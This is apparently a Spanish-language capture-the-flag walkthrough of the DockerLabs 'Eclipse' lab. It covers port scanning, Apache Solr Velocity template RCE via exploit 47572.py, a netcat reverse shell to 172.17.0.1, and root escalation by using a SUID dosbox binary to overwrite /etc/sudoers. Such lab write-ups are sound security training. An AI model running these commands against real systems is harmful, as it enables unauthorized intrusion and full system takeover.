## Introducción

Este documento presenta la resolución completa de la máquina **Eclipse**, desarrollada por *Xerosec* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web en el puerto 8983 que ejecuta **Apache Solr** con una versión vulnerable a **Remote Code Execution (RCE)** mediante Velocity Templates. Este exploit permite la ejecución de comandos y la obtención de una reverse shell como el usuario `ninhack`.
Una vez dentro, se identifica que el binario `dosbox` tiene permisos SUID. Aprovechando esta configuración, se monta el sistema de archivos y se modifica `/etc/sudoers` para otorgar privilegios sudo, obteniendo acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Eclipse.zip
sudo bash auto_deploy.sh Eclipse.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Eclipse/{content,exploits,nmap,scripts}
cd Eclipse
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP
* **8983/tcp** — HTTP (Apache Solr)

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1768804027/Ports_w2t0hu.png)

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:


## Paso 2 — Explotación (Acceso inicial)

### 2.1 Identificación de vulnerabilidad

Se identifica la versión de Apache Solr:

![Version](https://res.cloudinary.com/dewqswzke/image/upload/v1768804030/Version_l2csmw.png)

Se busca un exploit con `searchsploit`:

```bash
searchsploit apache solr
```

Se descarga y ejecuta el exploit para RCE mediante Velocity Templates:

```bash
python3 47572.py 172.17.0.2 8983 id
```

![RCE](https://res.cloudinary.com/dewqswzke/image/upload/v1768804028/RCE_znooks.png)

### 2.2 Reverse shell

Se inicia un listener:

```bash
nc -nlvp 443
```

Se ejecuta el exploit con el payload:

```bash
python3 47572.py 172.17.0.2 8983 "nc 172.17.0.1 443 -e /bin/bash"
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1768804028/ReverseShell_qpfdkd.png)

## Paso 3 — Escalada de privilegios

### 3.1 De ninhack → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1768804027/Find_xjk3el.png)

Se identifica que `dosbox` tiene permisos SUID. Se utiliza para montar el sistema de archivos y modificar `/etc/sudoers`:

```bash
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' \
-c "echo 'root ALL=(ALL:ALL) ALL' > c:$LFILE" \
-c "echo '$USER ALL=(ALL) NOPASSWD:ALL' >> c:$LFILE" \
-c exit
```

```bash
sudo su
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1768804029/Root_z4kzdq.png)
